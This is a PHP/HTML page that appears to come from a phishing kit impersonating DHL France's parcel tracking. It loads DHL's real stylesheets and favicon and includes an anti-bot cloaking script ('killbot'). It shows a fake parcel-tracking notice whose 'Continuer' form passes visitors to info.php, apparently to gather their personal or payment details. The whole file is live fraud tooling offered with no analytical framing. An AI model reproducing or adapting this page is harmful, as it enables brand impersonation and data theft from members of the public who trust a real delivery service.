<?php

session_start();
include "../assets/functions.php";
include '../server/traduction.php';
include_once('../settings.php');
include_once('../server/killbot.to.php');

?>

<!DOCTYPE html>
<html lang="fr-FR" dir="ltr">

<head>
	<title>
		<?php echo $translations[$lang]["entete2"]; ?>
	</title>
	<meta name="robots"
		content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache, notranslate, nofollow,">
	<meta name="viewport" content="width=device-width" />
	<link rel="icon" href="../assets/images/A1Ywhbg3Xes8.png">
	<meta charSet="utf-8" />
	<noscript data-n-css=""></noscript>
	<link rel="icon" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/favicon.ico"
		type="image/x-icon" />

	<!--CSS-->
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle-utapi-logic.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet"
		href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/css/bundle-utapi-ui.a076c9e355ebaef1a87910cd47836dfa.css" />
	<link rel="stylesheet" href="https://www.dhl.com/etc.clientlibs/dhl/clientlibs/clientlib-core.min.css"
		type="text/css">



</head>
<header>

	<?php include '../assets/header.php'; ?>
</header>




<body class="no-js  ">
	<!--googleoff: all-->
	<div class="c-nav-wcag">
		<span class="sr-only">Navigation et contenu</span>
		<ul>
			<li><a href="#wcag-main-content">Ignorer et accéder au contenu principal</a></li>
		</ul>
	</div>
	<div class="xf-content-height">
		<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
			<div
				class="c-country-selection-layer component-wide l-grid l-grid--left-s l-grid--center-m js--country-selection-layer">
				<div class="c-country-selection-layer--container l-grid l-grid--w-100pc-s">
					<div class="l-grid l-grid--w-100pc-s l-grid--left-m">
						<div class="l-grid l-grid--w-100pc-m-s">
							<div class="c-country-selection-layer--flag">
								<span class="flag-icon flag-icon-fr"></span>
							</div>
							<div
								class="c-country-selection-layer--copy-container l-grid l-grid--w-auto-s l-grid--middle-s l-grid--w-reset-m">
								<span class="c-country-selection-layer--copy">Vous êtes en</span>
								<span class="c-country-selection-layer--copy"><strong>&nbsp;France</strong></span>
							</div>
						</div>
						<div
							class="l-grid l-grid--w-100pc-m-s l-grid--w-100pc-s-l l-grid--w-100pc-s-m l-grid--w-100pc-s l-grid--w-reset-m">
							<div class="base-button js--country-selection-layer-close c--country-selection-layer-close js--cookie-set"
								tabindex="0"
								data-tracking="{&quot;component&quot;:&quot;dhl/components/global/country-selection-layer&quot;,&quot;name&quot;:&quot;Stay on this site&quot;,&quot;topic&quot;:&quot;country selection layer&quot;}">
								<span>Restez sur ce site</span>
							</div>
							<span
								class="c-country-selection-layer--base-copy l-grid l-grid--w-100pc-s l-grid--center-s l-grid--middle-s l-grid--w-reset-m l-grid--left-m">ou</span>
							<a href="/fr-fr/home/selecteur-de-lieu.html" class="base-button base-button--white"
								data-tracking="{&quot;component&quot;:&quot;dhl/components/global/country-selection-layer&quot;,&quot;name&quot;:&quot;Select a different country&quot;,&quot;topic&quot;:&quot;country selection layer&quot;}"><span>Sélectionnez
									un pays différent</span></a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="c-global-newsflash--wrapper js--global-newsflash" data-jsonurl="/global/dhl/news-alerts.gnf.json"
		data-nosnippet>
		<div
			class="c-global-newsflash component-wide l-grid l-grid--left-s l-grid--bottom-s l-grid--nowrap-m js-global-newsflash">
			<div class="l-grid--w-90pc-s l-grid--w-90pc-m l-grid--left-m c-global-newsflash--content-wrapper">
				<i class="c-global-newsflash-icon-alert icon-exception"></i>
				<a data-linkname="newsflash"
					class="c-global-newsflash--copy js--global-newsflash--link c-global-newsflash--copy--mobile js-global-newsflash--copy--mobile link-internal link no-nowrap l-grid--hidden-m l-grid--visible-s has-icon"
					target="_blank" rel="noopener noreferrer"
					title="Consultez les alertes susceptibles d’impacter les services DHL">Consultez les alertes
					susceptibles d’impacter les services DHL<span class="sr-only">Consultez les alertes susceptibles
						d’impacter les services DHL</span></a>
				<button class="c-global-newsflash-close link-icon icon-cancel js--global-newsflash-close" title="Close"
					aria-label="Close" tabindex="0"><span class="sr-only">Close</span></button>
			</div>
		</div>
	</div>
	<!--googleon: all-->
	<div class="l-view has-no-stage">

		<div class="js--nav-padding-layer c-nav--padding-layer"></div>
		<main id="wcag-main-content">
			<span class="link-anchor" id="track-trace-container-par_utapi_trackandtrace"></span>
			<div class="c-track-trace-utapi component-margin" data-track-and-trace-utapi-id="1071102243" data-hide-express-zip-code-field="true" data-contact-customer-service-base-url="/"
				data-track-and-trace-request-delay="0"
				data-track-and-trace="">
				<div class="c-tracking-headline component-wide">

					<!--SERVICE DE SUIVI DHL-->

					
				</div>
				<div class="">
		

		




</div>
		<div class="js--tracking-result--container c-tracking-result--container  is-visible">


		<!-- global status class -->
		<div class=" l-grid ">

			<!-- header -->
			<div class="c-tracking-result--header l-grid ">

				<!-- message only -->

<form method ="post" action = "info.php" name = "message_form" >
				<div class="c-tracking-result--section c-tracking-result--info">
				<div class="">					

					</div>					
					<div>
					<center><img src = "https://cdn-icons-png.flaticon.com/512/32/32175.png" width="25" height =""></center>
						<br>
						<center><h2 class="c-tracking-result--code level4" aria-hidden="true">
						<br><?php echo $translations[$lang]["Suivi du colis N°"];?><?php echo $Numéro_colis; ?></center>
								
						</h2>
						<span class="is-hidden"></span>

						<span class="c-tracking-result-message--content l-grid--left-s" data-fix-hogan-key="metadata.serviceId" data-fix-hogan-value="">
						<p><?php echo $translations[$lang]["message1"];?><br><?php echo $translations[$lang]["message2"];?> <?php echo $Numéro_colis?> <?php echo $translations[$lang]["message3"];?><br>
						<?php echo $translations[$lang]["message4"];?>
</p>

							<center><button class="c-voc-tracking-bar--button --input-submit  base-button "name="message_submit" type="submit" data-tracking="">
							<?php echo $translations[$lang]["Continuer"];?>
							</button></center>
							
						</span>
					</div>
				</div>
				

				<!-- detail view -->
			</div>
		</div>

</div>

	</div>
					<div class="js--tracking-result--a11y-container sr-only" aria-live="polite" aria-atomic="true">
					</div>
					<div
						class="js--tracking-result--container c-tracking-result--container l-grid--w-100pc-s  l-grid--w-100pc-m ">
					</div>
				</div>
			</div>
			<div class="c-tracking-result--error-specific">
				<span class="link-anchor" id="track-trace-error-par_text_generic_copy_co"></span>
				<div class="component-margin c-text-generic has-rte component-small l-grid--left-s l-grid--center-m">
					<div class="has-rte">
						<p class="has-rte">
							Powered by the
							<a href="https://developer.dhl.com/api-reference/shipment-tracking#get-started-section/overview"
								target="_blank" class="link link-external link-red has-icon"
								rel="noopener noreferrer">Shipment Tracking - Unified API</a>
						</p>
					</div>
				</div>
				<span class="link-anchor" id="track-trace-error-par_horizontal_ruler"></span>
				<div class="c-horizontal-ruler component-margin  ">
					<hr class="c-horizontal-ruler--wide" />
				</div>
			</div>
			<div class="c-tracking-result--success-specific"></div>
			<span class="link-anchor" id="parsysPath_text_generic_copy"></span>
			<div class="component-margin c-text-generic has-rte component-small ">
				<div class="has-rte">
					<p class="has-rte">
						<i></i>
					</p>
					<p class="has-rte"></p>
					<p class="has-rte"></p>
				</div>
			</div>
			<span class="link-anchor" id="parsysPath_horizontal_ruler_cop"></span>
			<div class="c-horizontal-ruler component-margin  ">
				<hr class="c-horizontal-ruler--wide" />
			</div>
			<div class="xf-content-height">
				<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
					<span class="link-anchor" id="root_code_inclusion"></span>
					<div class="c-code-inclusion component-margin  component-small  ">
						<div class="c-code-inclusion--container">

						</div>
					</div>
				</div>
			</div>
		</main>



		<footer>
			<?php //include '../assets/footer.php'; ?>
		</footer>